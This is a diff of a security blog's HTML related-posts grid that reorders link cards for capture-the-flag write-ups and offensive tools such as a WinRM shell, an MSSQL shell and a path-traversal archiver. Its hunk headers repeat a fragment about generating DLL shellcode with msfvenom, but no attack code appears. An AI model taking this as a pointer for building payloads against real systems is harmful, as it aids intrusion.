+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
     </footer>
   </a>
 </article>
@@ -883,17 +823,73 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
     </footer>
   </a>
 </article>
@@ -907,61 +903,21 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1015,21 +971,73 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1074,6 +1082,38 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1135,17 +1175,117 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
     </footer>
   </a>
 </article>
@@ -1155,21 +1295,113 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1222,6 +1454,66 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
           
            
            
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1355,6 +1647,38 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
@@ -1384,413 +1708,6 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
           
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -2002,245 +1919,21 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2358,6 +2051,21 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
@@ -2399,21 +2107,205 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2585,6 +2477,132 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
            
           
            
